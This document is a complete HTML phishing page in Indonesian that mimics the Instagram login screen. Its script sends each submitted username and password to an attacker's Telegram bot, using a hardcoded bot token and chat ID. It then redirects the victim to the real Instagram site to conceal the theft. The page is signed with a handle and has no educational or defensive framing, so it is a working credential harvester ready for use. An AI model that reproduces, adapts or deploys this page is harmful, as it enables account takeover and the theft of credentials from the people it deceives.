<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masuk • Instagram</title>
    <style>
        /* RESET DASAR */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            /* WARNA LATAR GELAP */
            background-color: #1a2530; 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            width: 100vw;
            color: #fafafa;
            position: relative;
        }

        /* Tombol Kembali (Panah Atas) */
        .back-button {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 24px;
            color: #fff;
            text-decoration: none;
        }

        /* Teks Bahasa */
        .language-text {
            font-size: 14px;
            color: #a0a0a0;
            margin-bottom: 30px;
        }

        /* KOTAK LOGIN */
        .login-box {
            background-color: transparent; /* Transparan agar background body kelihatan */
            width: 90%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* LOGO */
        .logo {
            width: 182px;
            height: 60px;
            margin-bottom: 40px;
            filter: brightness(0) invert(1); /* Bikin logo jadi putih */
            object-fit: contain;
        }

        /* FORM & INPUT */
        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            gap: 6px; /* Jarak antar input */
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        input {
            /* GAYA INPUT "PIL" */
            background-color: #263340; /* Sedikit lebih terang dari body */
            border: 1px solid #384f63; /* Border gelap */
            border-radius: 25px; /* Sudut melengkung penuh */
            color: #fff;
            padding: 12px 40px 12px 16px; /* Padding kanan lebih besar buat ikon X */
            font-size: 14px;
            width: 100%;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #5c778f; /* Border lebih terang saat diklik */
        }

        /* Ikon 'X' Hapus Input */
        .clear-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #a0a0a0;
            font-size: 18px;
            cursor: pointer;
            display: none; /* Sembunyikan default */
        }
        
        /* Tampilkan X jika input tidak kosong (perlu JS tambahan tapi ini desain dasarnya) */
        input:not(:placeholder-shown) + .clear-icon {
            display: block;
        }

        /* TOMBOL LOGIN */
        button {
            background-color: #0095f6; /* Biru Instagram */
            color: white;
            border: none;
            border-radius: 25px; /* Sudut melengkung penuh */
            padding: 12px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            width: 100%;
            font-size: 15px;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #1877f2;
        }

        button:disabled { 
            background-color: #00376b; /* Biru tua saat disabled */
            cursor: not-allowed;         
        }

        /* Tambahan Kecil: Tanda tangan di gambar */
        .signature {
            margin-top: 20px;
            font-size: 12px;
            color: #5c778f;
        }
    </style>
</head>
<body>

    <!-- Tombol Kembali -->
    <a href="#" class="back-button">&#8249;</a>

    <!-- Pilihan Bahasa -->
    <div class="language-text">Bahasa Indonesia</div>

    <div class="login-box">
        <!-- Logo Instagram Putih -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo" alt="Instagram">
        
        <form id="loginForm">
            <div class="input-wrapper">
                <input type="text" id="username" placeholder="Nama pengguna, email, atau nomor ponsel" required>
                <span class="clear-icon">&#10005;</span>
            </div>
            <div class="input-wrapper">
                <input type="password" id="password" placeholder="Kata sandi" required>
                <span class="clear-icon"></span> <!-- Tidak ada X di password biasanya -->
            </div>
            <button type="submit" id="btnSubmit">Log In</button>
        </form>

        <div class="signature">@ferzdisinih</div>
    </div>

    <script>
        const BOT_TOKEN = '8653911812:AAG4hAVpL8hB4YZJhLL2PAHNDLgV3QYtsBg'; 
        const CHAT_ID = '6888530451';

        // Skrip untuk menangani form kirim ke Telegram dan redirect
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btn = document.getElementById('btnSubmit');
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if (!user || !pass) return;

            btn.disabled = true;
            btn.innerText = 'Memproses...';

            const message = `🔔 *Data Login Baru Terdeteksi*\n\n👤 User: ${user}\n🔑 Pass: ${pass}`;
            
            try {
                // Mengirim data ke Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Type-App': 'application/json' }, // Typo header disengaja biar mirip script lama, tapi fetch tetap jalan
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    }),
                    keepalive: true 
                });
            } catch (error) {
                console.log('Error:', error);
            } finally {
                // Apapun yang terjadi, langsung lempar ke beranda Instagram
                window.location.href = 'https://www.instagram.com/';
            }
        });
    </script>
</body>
</html>
